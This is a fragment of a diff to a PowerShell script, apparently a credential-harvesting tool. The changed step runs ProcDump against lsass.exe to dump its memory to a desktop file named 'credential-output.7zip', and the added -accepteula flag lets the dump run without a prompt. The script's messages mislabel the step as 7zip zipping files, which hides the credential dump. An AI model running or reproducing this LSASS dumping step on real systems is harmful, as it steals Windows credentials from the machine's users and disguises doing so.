@@ -47,7 +47,7 @@ try {
 
 # Step 4: Run ProcDump to capture LSASS dump on the desktop
 try {
-    & $desktopPath -ma lsass.exe ([System.IO.Path]::Combine([System.Environment]::GetFolderPath("Desktop"), "credential-output.7zip"))
+    & $desktopPath -accepteula -ma lsass.exe ([System.IO.Path]::Combine([System.Environment]::GetFolderPath("Desktop"), "credential-output.7zip"))
     Write-Output "7zip zipping requested files."
 } catch {
     Write-Output "Failed to execute 7zip: $_"
